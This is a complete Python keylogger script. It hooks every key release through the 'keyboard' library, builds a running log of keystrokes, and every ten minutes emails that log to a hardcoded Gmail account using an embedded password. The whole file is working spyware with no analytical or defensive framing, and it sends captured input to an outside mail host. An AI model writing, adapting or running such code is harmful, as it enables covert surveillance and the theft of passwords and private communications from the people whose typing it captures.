import keyboard
import yagmail
import time
from threading import Semaphore, Timer

sendEvery = 600
email = "iamabotforme@gmail.com"
password = "ThisIsAPassword"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    def sendmail(self, email, password, message):
        yag = yagmail.SMTP(email, password)
        yag.send(email, "Key Log for: " + time.ctime(), message)
    def report(self):
        if self.log:
            self.sendmail(email, password, self.log)
        print("Sent Email")
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()
    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()
if __name__ == "__main__":
    keylogger = Keylogger(interval=sendEvery)
    keylogger.start()